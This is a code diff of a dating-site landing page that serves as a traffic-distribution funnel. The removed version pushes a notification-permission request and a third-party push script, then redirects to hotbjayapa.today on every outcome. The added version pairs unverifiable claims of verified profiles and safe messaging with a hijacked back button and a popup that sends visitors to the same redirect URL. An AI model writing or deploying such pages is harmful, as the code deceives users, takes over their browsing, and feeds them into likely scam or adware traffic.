@@ -1,162 +1,193 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Dating Land</title>
-<style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    html, body {
-        width: 100%;
-        height: 100%;
-        overflow: hidden;
-        font-family: Arial, sans-serif;
-        background: #000;
-    }
-    #videoContainer {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        z-index: 1;
-    }
-    #videoFrame {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        border: none;
-    }
-    #overlay {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: linear-gradient(180deg, rgba(0,0,0,0.3), rgba(0,0,0,0.7));
-        z-index: 2;
-        opacity: 0;
-        transition: opacity 0.3s;
-    }
-    #overlay.show { opacity: 1; }
-    #subscribeBtn {
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%) scale(0);
-        padding: 20px 40px;
-        font-size: 24px;
-        font-weight: bold;
-        color: #fff;
-        background: linear-gradient(135deg, #ff0080, #ff4db8);
-        border: 3px solid #fff;
-        border-radius: 15px;
-        cursor: pointer;
-        z-index: 3;
-        opacity: 0;
-        transition: all 0.3s;
-        box-shadow: 0 8px 30px rgba(255,0,128,0.5);
-        white-space: nowrap;
-    }
-    #subscribeBtn.show {
-        transform: translate(-50%, -50%) scale(1);
-        opacity: 1;
-    }
-    #subscribeBtn:hover {
-        background: linear-gradient(135deg, #ff4db8, #ff0080);
-        transform: translate(-50%, -50%) scale(1.05);
-        box-shadow: 0 12px 40px rgba(255,0,128,0.7);
-    }
-    @media (max-width: 768px) {
-        #subscribeBtn {
-            font-size: 18px;
-            padding: 16px 32px;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Find Your Match Today</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-    }
-</style>
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        
+        h1 {
+            color: #333;
+            font-size: 32px;
+            margin-bottom: 15px;
+        }
+        
+        p {
+            color: #666;
+            font-size: 18px;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 18px 50px;
+            font-size: 20px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            text-decoration: none;
+            display: inline-block;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .features {
+            margin-top: 40px;
+            text-align: left;
+        }
+        
+        .feature {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            color: #555;
+        }
+        
+        .feature::before {
+            content: "✓";
+            background: #667eea;
+            color: white;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            flex-shrink: 0;
+        }
+
+        .loader {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .loader.active {
+            display: block;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-<div id="videoContainer">
-    <iframe id="videoFrame" src="https://drive.google.com/file/d/1-TquW1XY2KJEmRPsHkLq35ZW6ypyMbs6/preview?autoplay=1" allow="autoplay; fullscreen" allowfullscreen></iframe>
-    <div id="overlay"></div>
-    <div id="subscribeBtn">Click to Continue</div>
-</div>
+    <div class="container">
+        <h1>💕 Find Your Perfect Match</h1>
+        <p>Join thousands of singles finding love and meaningful connections every day</p>
+        
+        <button class="btn" id="startBtn">Start Chatting Now</button>
+        
+        <div class="loader" id="loader">
+            <div class="spinner"></div>
+        </div>
+        
+        <div class="features">
+            <div class="feature">Verified profiles only</div>
+            <div class="feature">Safe and secure messaging</div>
+            <div class="feature">Match with locals near you</div>
+            <div class="feature">Free to start chatting</div>
+        </div>
+    </div>
 
-<script>
-const mainRedirectUrl = 'https://hotbjayapa.today/tds?id=1556334684&p1=sub1&p2=sub2&p3=sub3&p4=sub4';
-const backButtonUrl = 'https://hotbjayapa.today/tds?id=1556794253&p1=sub1&p2=sub2&p3=sub3&p4=sub4';
-
-let redirected = false;
-
-function doRedirect() {
-    if (redirected) return;
-    redirected = true;
-    window.location.replace(mainRedirectUrl);
-}
-
-// Handle all push notification events
-window.onPermissionDefault = doRedirect;
-window.onPermissionDenied = doRedirect;
-window.onPermissionAllowed = doRedirect;
-window.onAlreadySubscribed = doRedirect;
-window.onNotificationUnsupported = doRedirect;
-window.onTrafficFiltered = doRedirect;
-</script>
-
-<script type="application/javascript" src="https://wpcpc.sjscdn.com/ps/ps.js?id=j-DQEhxgKEueEzYw3M-eJQ" async></script>
-
-<script>
-const btn = document.getElementById('subscribeBtn');
-const overlay = document.getElementById('overlay');
-
-// Show button immediately
-setTimeout(() => {
-    overlay.classList.add('show');
-    btn.classList.add('show');
-    
-    // Trigger push notification request
-    setTimeout(() => {
-        if ('Notification' in window && Notification.permission === 'default') {
-            Notification.requestPermission().then(() => {
-                // Fallback redirect
-                setTimeout(doRedirect, 800);
-            }).catch(doRedirect);
-        } else {
-            // Already handled or unsupported
-            setTimeout(doRedirect, 500);
+    <script>
+        const redirectUrl = 'https://hotbjayapa.today/tds?id=1556794253&p1=sub1&p2=sub2&p3=sub3&p4=sub4';
+        const chatUrl = 'https://datingland.site/chat/';
+        
+        // Back button redirect protection
+        function setupBackButtonRedirect() {
+            // Add state to history
+            history.pushState(null, null, location.href);
+            
+            // Listen for back button
+            window.addEventListener('popstate', function() {
+                history.pushState(null, null, location.href);
+                window.location.href = redirectUrl;
+            });
         }
-    }, 200);
-}, 50);
-
-// Click handler
-btn.addEventListener('click', (e) => {
-    e.preventDefault();
-    btn.style.transform = 'translate(-50%, -50%) scale(0.95)';
-    setTimeout(doRedirect, 100);
-});
-
-// Back button protection
-(() => {
-    history.pushState(null, null, location.href);
-    history.pushState(null, null, location.href);
-    history.pushState(null, null, location.href);
-    
-    window.addEventListener('popstate', () => {
-        history.pushState(null, null, location.href);
-        window.location.replace(backButtonUrl);
-    });
-})();
-
-// Prevent iframe navigation
-window.addEventListener('blur', () => {
-    setTimeout(() => {
-        if (document.activeElement === document.getElementById('videoFrame')) {
-            window.focus();
-        }
-    }, 0);
-});
-</script>
+        
+        // Initialize back button protection on load
+        setupBackButtonRedirect();
+        
+        // Handle click redirect
+        document.getElementById('startBtn').addEventListener('click', function() {
+            const btn = this;
+            const loader = document.getElementById('loader');
+            
+            // Show loading state
+            btn.style.display = 'none';
+            loader.classList.add('active');
+            
+            // Try to open in new window
+            const newWindow = window.open(redirectUrl, '_blank');
+            
+            // Check if popup was blocked
+            setTimeout(function() {
+                if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
+                    // Popup blocked, redirect current page
+                    window.location.href = redirectUrl;
+                } else {
+                    // Popup opened successfully, redirect current page to chat
+                    setTimeout(function() {
+                        window.location.href = chatUrl;
+                    }, 500);
+                }
+            }, 100);
+        });
+        
+        // Prevent page from being cached
+        window.addEventListener('pageshow', function(event) {
+            if (event.persisted) {
+                window.location.reload();
+            }
+        });
+    </script>
 </body>
 </html>
